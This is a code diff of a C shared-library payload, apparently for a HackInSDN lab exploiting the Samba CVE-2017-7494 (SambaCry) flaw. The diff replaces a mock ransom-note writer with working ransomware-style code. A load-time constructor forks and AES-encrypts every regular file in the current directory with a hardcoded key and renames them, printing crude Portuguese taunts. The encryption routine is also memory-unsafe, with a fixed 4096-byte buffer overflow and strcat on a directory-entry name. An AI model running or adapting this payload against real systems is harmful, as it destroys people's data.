@@ -1,20 +1,75 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
 
-void __attribute__((constructor)) poc_exploit() {
-    
-    FILE *f = fopen("/data/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt", "w");
-    
-    if (f == NULL) {
-        return; 
+unsigned char key[] = "IniKey32ByteUntukAES256!!!12345"; 
+unsigned char iv[]  = "IniIV16ByteCok!!";               
+
+void encrypt_file(const char *path) {
+    FILE *f = fopen(path, "rb+");
+
+    if (!f) return;
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    unsigned char *plaintext = malloc(fsize);
+    fread(plaintext, 1, fsize, f);
+
+    unsigned char ciphertext[4096];
+    int outlen, total = 0;
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
+
+    if (!EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, fsize)) {
+        free(plaintext); EVP_CIPHER_CTX_free(ctx); return;
     }
-    
-    fprintf(f, "------------------------------------\n");
-    fprintf(f, "OLA, O SEU SISTEMA FOI COMPROMETIDO!\n\n");
-    fprintf(f, "Isto é uma prova de conceito para o lab HackInSDN.\n");
-    fprintf(f, "O seu serviço Samba estava vulnerável ao CVE-2017-7494 (SambaCry). CAGE AGORA MESMO NA SUA MAO E COMA SUA PROPRIA BOSTA, ESSA É A UNICA MANEIRA DE RECUPERAR SEUS ARQUIVOS.\n");
-    fprintf(f, "------------------------------------\n");
+    total += outlen;
+
+    if (!EVP_EncryptFinal_ex(ctx, ciphertext + total, &outlen)) {
+        free(plaintext); EVP_CIPHER_CTX_free(ctx); return;
+    }
+    total += outlen;
+
+    fseek(f, 0, SEEK_SET);
+    fwrite(ciphertext, 1, total, f);
     fclose(f);
-    
-    system("chmod 777 /data/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt");
+    rename(path, strcat((char*)path, ".encrypted")); 
+    free(plaintext);
+    EVP_CIPHER_CTX_free(ctx);
+}
+
+void __attribute__((constructor)) run_payload(void) {
+    if (fork() == 0) {
+        printf("=======================================\n");
+        printf("   Vai tomando\n");
+        printf("   Key = %s\n", key);
+        printf("   IV  = %s\n", iv);
+        printf("   Iniciando criptografia em background...\n");
+        printf("=======================================\n");
+
+        DIR *d = opendir(".");
+        struct dirent *dir;
+        if (d) {
+            while ((dir = readdir(d)) != NULL) {
+                if (strstr(dir->d_name, ".encrypted") || strstr(dir->d_name, "oiii")) continue;
+                
+                if (dir->d_type == DT_REG) {
+                    printf("Criptografando %s ... \n", dir->d_name);
+                    encrypt_file(dir->d_name);
+                }
+            }
+            closedir(d);
+        }
+
+        printf("\nTodos os arquivos estão criptografados\n");
+        printf("Descriptografe usando o mesmo script\n");
+        printf("Ou crie o seu próprio, sla, não sou teu pai\n");
+
+        exit(0); 
+    }    
 }
